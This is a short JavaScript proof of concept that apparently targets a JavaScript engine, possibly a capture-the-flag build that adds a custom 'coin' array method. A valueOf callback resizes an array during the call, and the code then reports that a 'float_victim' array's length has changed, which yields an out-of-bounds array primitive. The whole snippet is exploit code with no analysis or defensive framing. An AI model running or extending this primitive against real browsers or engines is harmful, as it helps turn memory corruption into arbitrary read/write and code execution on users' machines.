var val= {
    valueOf:function(){
        array.length = 0x100;
        return  1024;
    }
}

var array = new Array(30);
float_victim=[1.1, 2.2];
array.coin(34,val);
console.log("[+] float_victim(OOBARR) array length is changed to :"+float_victim.length)

